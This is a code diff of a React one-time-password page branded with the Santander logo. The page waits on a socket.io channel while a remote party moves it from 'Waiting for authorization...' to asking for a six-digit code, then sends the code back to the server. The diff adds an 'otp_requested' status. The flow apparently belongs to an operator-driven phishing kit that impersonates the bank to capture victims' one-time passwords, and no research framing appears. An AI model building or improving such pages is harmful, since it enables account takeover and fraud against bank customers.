@@ -1,12 +1,13 @@
 import React, { useState, useEffect, FormEvent } from 'react';
 import { useSearchParams, useNavigate } from 'react-router-dom';
 import io from 'socket.io-client';
+import type { Socket as SocketIOClientSocket } from 'socket.io-client';
 import santanderLogo from '/santander-logo.svg';
 import Spinner from '../components/Spinner';
 import { WS_URL } from '../config';
 
 interface StatusUpdateData {
-    status: 'pending_otp_challenge' | 'approved' | 'denied';
+    status: 'pending_otp_challenge' | 'approved' | 'denied' | 'otp_requested';
     phone_ending_digits?: string;
 }
 
@@ -20,7 +21,7 @@ const OtpVerificationPage = () => {
     const [otp, setOtp] = useState('');
     const [errorMessage, setErrorMessage] = useState('');
 
-    const [socket, setSocket] = useState<import('socket.io-client').Socket | null>(null);
+    const [socket, setSocket] = useState<SocketIOClientSocket | null>(null);
 
   useEffect(() => {
         if (!attemptId) {
@@ -30,7 +31,7 @@ const OtpVerificationPage = () => {
 
         const newSocket = io(WS_URL, {
             query: { attemptId }
-        }) as import('socket.io-client').Socket;
+        });
 
         setSocket(newSocket);
 
@@ -40,15 +41,15 @@ const OtpVerificationPage = () => {
     });
 
         newSocket.on('status_updated', (data: StatusUpdateData) => {
-            if (data.status === 'pending_otp_challenge' && data.phone_ending_digits) {
-                setPhoneEnding(data.phone_ending_digits);
+            if ((data.status === 'pending_otp_challenge' && data.phone_ending_digits) || data.status === 'otp_requested') {
+                if (data.phone_ending_digits) setPhoneEnding(data.phone_ending_digits);
                 setPageStatus('entering_otp'); // Go directly to OTP entry
                 setErrorMessage('');
             } else if (data.status === 'approved') {
                 navigate('/success');
             } else if (data.status === 'denied') {
                 navigate('/login?status=denied');
-    }
+            }
         });
 
         newSocket.on('error', (data: { message?: string }) => {
@@ -66,12 +67,12 @@ const OtpVerificationPage = () => {
             socket.emit('user_submitted_otp', { attemptId, otp });
         } else {
             setErrorMessage('Please enter a 6-digit OTP.');
-        }
-    };
-
+    }
+  };
+  
     const renderContent = () => {
         if (pageStatus === 'entering_otp') {
-            return (
+    return (
                 <form onSubmit={handleOtpSubmit}>
                     <h2 className="text-xl font-semibold text-center text-gray-800 mb-4">Enter Your One-Time Password</h2>
                     <p className="text-center text-gray-600 mb-6">A 6-digit code was sent to the number ending in <span className="font-bold">{phoneEnding}</span>.</p>
@@ -85,11 +86,11 @@ const OtpVerificationPage = () => {
                     />
                     <button type="submit" className="w-full bg-red-600 text-white font-bold py-3 px-4 rounded-md hover:bg-red-700">Verify Code</button>
                 </form>
-            );
-        }
+    );
+  }
 
         // Default case: show spinner
-        return (
+  return (
             <>
                 <h2 className="text-xl font-semibold text-center text-gray-800 mb-6">Waiting for authorization...</h2>
                 <Spinner />
